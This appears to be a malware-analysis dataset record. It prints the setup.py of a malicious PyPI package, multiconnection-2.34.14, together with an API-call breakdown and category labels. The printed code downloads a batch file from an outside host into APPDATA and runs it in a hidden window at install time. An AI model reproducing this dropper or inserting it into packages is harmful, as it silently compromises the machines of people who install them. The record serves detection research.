[
  {
    "pyfile": "setup.py",
    "code_snippet": "import urllib.request\nimport os\nimport time\nimport subprocess\n\nt = \"https://frvezdffvvvv.pythonanywhere.com/getrnr\"\n\npath,_ = urllib.request.urlretrieve(t, os.getenv('APPDATA')+\"\\\\8.bat\")\ntime.sleep(5)\n\nsubprocess.Popen(os.getenv('APPDATA')+\"\\\\8.bat\", creationflags=subprocess.CREATE_NO_WINDOW)\n\ntime.sleep(10)",
    "pattern_analysis": {
      "api_sequence": [
        "os.getenv",
        "urllib.request.urlretrieve",
        "time.sleep",
        "os.getenv",
        "subprocess.Popen",
        "time.sleep"
      ],
      "api_sequence_with_args": [
        "os.getenv('APPDATA')",
        "urllib.request.urlretrieve(t, os.getenv('APPDATA')+\"\\8.bat\")",
        "time.sleep(5)",
        "os.getenv('APPDATA')",
        "subprocess.Popen(os.getenv('APPDATA')+\"\\8.bat\", creationflags=subprocess.CREATE_NO_WINDOW)",
        "time.sleep(10)"
      ],
      "mapped_sequence": [
        {
          "api_name": "os.getenv",
          "id": "get_env_var",
          "description": "Retrieves value of environment variable",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "environment_information"
        },
        {
          "api_name": "urllib.request.urlretrieve",
          "id": "download_file_url",
          "description": "Downloads file from URL to specified local path",
          "first_id": "network_file_transfer",
          "second_id": "file_download",
          "third_id": "url_file_acquisition"
        },
        {
          "api_name": "time.sleep",
          "id": "suspend_execution",
          "description": "Suspends execution for specified seconds",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "time_operations"
        },
        {
          "api_name": "os.getenv",
          "id": "get_env_var",
          "description": "Retrieves value of environment variable",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "environment_information"
        },
        {
          "api_name": "subprocess.Popen",
          "id": "spawn_process_no_window",
          "description": "Spawns new process to execute command without shell window",
          "first_id": "system_operations",
          "second_id": "process_management",
          "third_id": "process_creation"
        },
        {
          "api_name": "time.sleep",
          "id": "suspend_execution",
          "description": "Suspends execution for specified seconds",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "time_operations"
        }
      ],
      "contextual_code": "import urllib.request\nimport os\nimport time\nimport subprocess\n\nt = \"https://frvezdffvvvv.pythonanywhere.com/getrnr\"\n\n# Download file to APPDATA directory\npath,_ = urllib.request.urlretrieve(t, os.getenv('APPDATA')+\"\\8.bat\")\n# Wait for 5 seconds\ntime.sleep(5)\n# Execute the downloaded file with no window\nsubprocess.Popen(os.getenv('APPDATA')+\"\\8.bat\", creationflags=subprocess.CREATE_NO_WINDOW)\n# Wait for 10 seconds\ntime.sleep(10)"
    }
  },
  {
    "metadata": {
      "package_name": "multiconnection-2.34.14",
      "source_path": "/home/blue/PyPIAgent/Dataset/study/unzip_malware/multiconnection-2.34.14/multiconnection-2.34.14/setup.py",
      "code_hash": "229400aa13e82cbd686dbd81312ebbe8"
    }
  }
]